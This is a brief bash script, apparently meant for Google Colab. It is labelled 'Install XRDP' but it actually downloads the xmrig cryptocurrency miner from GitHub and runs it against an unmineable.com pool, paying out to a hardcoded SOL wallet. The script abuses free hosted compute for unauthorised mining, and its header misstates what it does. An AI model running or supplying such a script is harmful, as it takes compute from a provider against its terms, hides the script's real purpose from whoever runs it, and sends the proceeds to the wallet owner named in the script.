#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o rx-asia.unmineable.com:3333 -u SOL:2YnX8LpfbLuKUmWmJw3yV5M5nuCrfkgCBJj1LScceomu.rig1#tz6w-gbkp
